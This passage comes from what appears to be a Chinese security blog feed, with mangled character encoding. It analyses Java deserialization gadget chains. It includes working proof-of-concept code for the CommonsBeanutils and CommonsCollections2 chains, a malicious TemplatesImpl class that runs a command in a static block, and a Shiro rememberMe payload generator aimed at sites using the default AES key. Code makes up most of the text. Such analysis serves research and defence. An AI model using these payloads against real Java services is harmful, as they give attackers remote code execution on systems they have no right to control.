PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,</span><br><span class="line">                comparator);</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BeanComparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a>BeanComparator</h3><p>å¯ä»¥çœ‹åˆ°pocä¸­ç”¨åˆ°çš„å°±æ˜¯è¿™ä¸ª<code>BeanComparator</code>æ¯”è¾ƒå™¨<br>è¿™ä¸ªæ¯”è¾ƒå™¨ç”¨äºæ¯”è¾ƒä¸¤ä¸ª<code>JavaBean</code>æ˜¯å¦ç›¸ç­‰<br>å®ƒçš„æ¯”è¾ƒæ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">( <span class="keyword">final</span> T o1, <span class="keyword">final</span> T o2 )</span> &#123;</span><br><span class="line"><span class="keyword">if</span> ( property == <span class="literal">null</span> ) &#123;</span><br><span class="line">        <span class="comment">// compare the actual objects</span></span><br><span class="line">        <span class="keyword">return</span> internalCompare( o1, o2 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty( o1, property );</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty( o2, property );</span><br><span class="line">        <span class="keyword">return</span> internalCompare( value1, value2 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( <span class="keyword">final</span> IllegalAccessException iae ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;IllegalAccessException: &quot;</span> +</span><br><span class="line">        iae.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( <span class="keyword">final</span> InvocationTargetException ite ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;InvocationTargetException: &quot;</span> +</span><br><span class="line">        ite.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( <span class="keyword">final</span> NoSuchMethodException nsme ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;NoSuchMethodException: &quot;</span> +</span><br><span class="line">        nsme.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„è¿™ä¸ªæ–¹æ³•ï¼š<code>getProperty()</code>å¯ä»¥ç”¨æ¥è·å–getå°è£…å‡½æ•°<br>å›å¿†ä¹‹å‰çš„<code>TemplatesImpl</code>åŠ è½½ç±»çš„æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt;</span><br><span class="line">TemplatesImpl#defineTransletClasses() -&gt;</span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•ï¼š<code>getOutputProperties()</code><br>æ°å¥½ç¬¦åˆä»¥<code>get</code>å¼€å¤´çš„JavaBeanå°è£…å‡½æ•°çš„æ ‡å‡†<br>é‚£åªè¦æ§åˆ¶ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PropertyUtils.getProperty(<span class="string">&#x27;TemplatesImplå¯¹è±¡&#x27;</span>,<span class="string">&#x27;outputProperties&#x27;</span>);</span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥è°ƒç”¨åˆ°<code>TemplatesImpl.getOutputProperties()</code><br>åŠ è½½æ¶æ„ç±»</p><h3 id="æ¶æ„ç±»"><a href="#æ¶æ„ç±»" class="headerlink" title="æ¶æ„ç±»"></a>æ¶æ„ç±»</h3><p>è¿™ä¸ªæ¶æ„ç±»å¿…é¡»è¦é€‚ç”¨äº<code>TemplatesImpl</code><br>ä¹Ÿå°±æ˜¯é‚£æ—¶å€™è®¨è®ºè¿‡çš„ç»§æ‰¿<code>AbstractTranslet</code><br>å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// æ¶æ„ä»£ç ï¼ˆä¾‹å¦‚æ‰§è¡Œå‘½ä»¤ï¼‰</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æ­¤ä¸€æ¥å°±æˆåŠŸå®ç°äº†å‘½ä»¤æ‰§è¡Œ</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaé“¾å­åˆ†æâ€”CommonsCollections2</title>
      <link href="/2025/05/10/java-cc2/"/>
      <url>/2025/05/10/java-cc2/</url>
      
        <content type="html"><![CDATA[<h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â€‹â€‹Apache Commons Collections 3.2.1 æˆ– 4.0â€‹â€‹ï¼ˆæœªä¿®å¤ç‰ˆæœ¬ï¼‰</span><br><span class="line">â€‹â€‹JDK â‰¤ 8u71â€‹â€‹ï¼ˆé«˜ç‰ˆæœ¬JDKéœ€ç»“åˆå…¶ä»–å…¥å£ç±»ç»•è¿‡ï¼‰</span><br></pre></td></tr></table></figure><h1 id="ä¾èµ–"><a href="#ä¾èµ–" class="headerlink" title="ä¾èµ–"></a>ä¾èµ–</h1><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. æ„é€ Transformeré“¾</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  <span class="comment">// è·å–Runtimeç±»</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),  <span class="comment">// åå°„è°ƒç”¨Runtime.getMethod(&quot;getRuntime&quot;)</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),  <span class="comment">// åå°„è°ƒç”¨getRuntime.invoke(null)</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;  <span class="comment">// æ‰§è¡Œcalc.exe</span></span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. è®¾ç½®TransformingComparator</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. æ„é€ æ¶æ„PriorityQueue</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);  <span class="comment">// æ·»åŠ ä¸¤ä¸ªå…ƒç´ è§¦å‘æ¯”è¾ƒé€»è¾‘</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. ç”Ÿæˆåºåˆ—åŒ–Payload</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. æ¨¡æ‹Ÿååºåˆ—åŒ–è§¦å‘æ¼æ´ï¼ˆå®é™…æ”»å‡»ä¸­éœ€å‘é€æ­¤Payloadåˆ°ç›®æ ‡ï¼‰</span></span><br><span class="line">        <span class="comment">// byte[] payload = baos.toByteArray();</span></span><br><span class="line">        <span class="comment">// ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(payload));</span></span><br><span class="line">        <span class="comment">// ois.readObject();  // æ­¤å¤„ä¼šå¼¹å‡ºè®¡ç®—å™¨</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h1><h3 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransformingComparator æ˜¯ Apache Commons Collections åº“ä¸­çš„ä¸€ä¸ª â€‹</span><br><span class="line">â€‹æ¯”è¾ƒå™¨ï¼ˆComparatorï¼‰â€‹â€‹ å®ç°ï¼Œ</span><br><span class="line">å®ƒçš„æ ¸å¿ƒåŠŸèƒ½æ˜¯ï¼šâ€‹â€‹</span><br><span class="line">åœ¨æ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡ä¹‹å‰ï¼Œå…ˆé€šè¿‡ä¸€ä¸ª Transformer å¯¹å®ƒä»¬è¿›è¡Œè½¬æ¢ï¼Œ</span><br><span class="line">å†åŸºäºè½¬æ¢åçš„ç»“æœè¿›è¡Œæ¯”è¾ƒâ€‹â€‹ã€‚</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹å…·ä½“æ–¹æ³•çš„å®ç°ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer, Comparator&lt;O&gt; decorated)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">    <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">    <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> (O)<span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> (O)<span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªç±»å¯ä»¥å®ç°å°†ä¸¤ä¸ªå€¼é€šè¿‡è®¾å®šå¥½çš„ç¿»è¯‘å™¨<br>ç¿»è¯‘åå†è¿›è¡Œæ¯”è¾ƒ</p><p>è°ƒç”¨<code>compare()</code>æ–¹æ³•æ—¶è§¦å‘ç¿»è¯‘çš„æ“ä½œ</p><h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p>æ—¢ç„¶æœ€ååºåˆ—åŒ–çš„æ˜¯ä»–é‚£ä¹ˆå°±å…ˆçœ‹ä¸€ä¸‹<code>readObject()</code>æ–¹æ³•<br>ä»¥åŠè§¦å‘æ¯”è¾ƒç¿»è¯‘å™¨<code>compare()</code>æ–¹æ³•çš„è·¯å¾„</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    s.readInt(); <span class="comment">// è¯»å–é˜Ÿåˆ—å¤§å°</span></span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[initialCapacity]; <span class="comment">// åˆå§‹åŒ–é˜Ÿåˆ—æ•°ç»„</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject(); <span class="comment">// é€ä¸ªè¯»å–å…ƒç´ </span></span><br><span class="line">    heapify(); <span class="comment">// é‡å»ºå †ç»“æ„ï¼ˆå…³é”®è§¦å‘ç‚¹ï¼‰</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]); <span class="comment">// ä»ä¸­é—´èŠ‚ç‚¹å¼€å§‹è°ƒæ•´å †</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)  <span class="comment">// ä½¿ç”¨è‡ªå®šä¹‰Comparator</span></span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span>  <span class="comment">// ä½¿ç”¨è‡ªç„¶é¡ºåº</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>; <span class="comment">// å·¦å­èŠ‚ç‚¹</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;     <span class="comment">// å³å­èŠ‚ç‚¹</span></span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>) <span class="comment">// è°ƒç”¨Comparator.compare()</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æ­¤ä¸€æ¥å°±æˆåŠŸçš„å®ç°äº†è®¡ç®—å™¨çš„å¼¹å‡º</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaé“¾å­åˆ†æâ€”Shiro</title>
      <link href="/2025/04/18/java-shiro/"/>
      <url>/2025/04/18/java-shiro/</url>
      
        <content type="html"><![CDATA[<h1 id="Shiroååºåˆ—åŒ–"><a href="#Shiroååºåˆ—åŒ–" class="headerlink" title="Shiroååºåˆ—åŒ–"></a>Shiroååºåˆ—åŒ–</h1><p>åœ¨CC3çš„é“¾å­ä¸­ä½¿ç”¨äº†<code>Templateslmpl</code>åŠ è½½ä»»æ„æ¶æ„ç±»<br>å¯ä»¥æ‰§è¡Œä»»æ„javaä»£ç </p><p>å®ƒä¸CC6é“¾å­çš„åŒºåˆ«<br>å°±åƒphpä¸­<code>call_user_func</code>ä¸<code>eval</code>çš„åŒºåˆ«ä¸€æ ·<br>é€ æˆä»»æ„ä»£ç æ‰§è¡Œçš„<code>eval</code>æ˜¾ç„¶å…·æœ‰æ›´é«˜çš„ä»·å€¼</p><p>shiroæ¡†æ¶çš„æ¼æ´åœ¨remembermeçš„è‡ªåŠ¨ç™»å½•ä¸Š<br>ä¼šå­˜ä¸€æ®µaesåŠ å¯†çš„æ•°æ®åœ¨æµè§ˆå™¨ä¸­ï¼Œå†æ¬¡è®¿é—®æ—¶é€šè¿‡cookieæºå¸¦<br>åˆ°è¾¾åç«¯åååºåˆ—åŒ–ä»¥åŠ è½½ç”¨æˆ·æ•°æ®<br>è€Œè¿™ä¸ªaesåŠ å¯†æœ‰ä¸€ä¸ªé»˜è®¤çš„Key<br>é‚£ä¹ˆå°±å¯ä»¥æ”»å‡»ä¸ä¿®æ”¹Keyçš„ç½‘ç«™</p><h1 id="Shiroé“¾å­"><a href="#Shiroé“¾å­" class="headerlink" title="Shiroé“¾å­"></a>Shiroé“¾å­</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollectionsShiro</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getPayload(<span class="type">byte</span>[] clazzBytes) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazzBytes&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, obj);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.clear();</span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»£ç å‰åçš„éƒ¨åˆ†éƒ½å¾ˆç†Ÿæ‚‰<br>ä½†æ˜¯ä¸­é—´çš„éƒ¨åˆ†çœ‹ç€å¾ˆå¥‡æ€ª<br>ä¸å¦¨æŠŠä¹‹å‰çš„ä»£ç è´´ä¸Šå¯¹æ¯”ä¸€ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//CC6</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">            <span 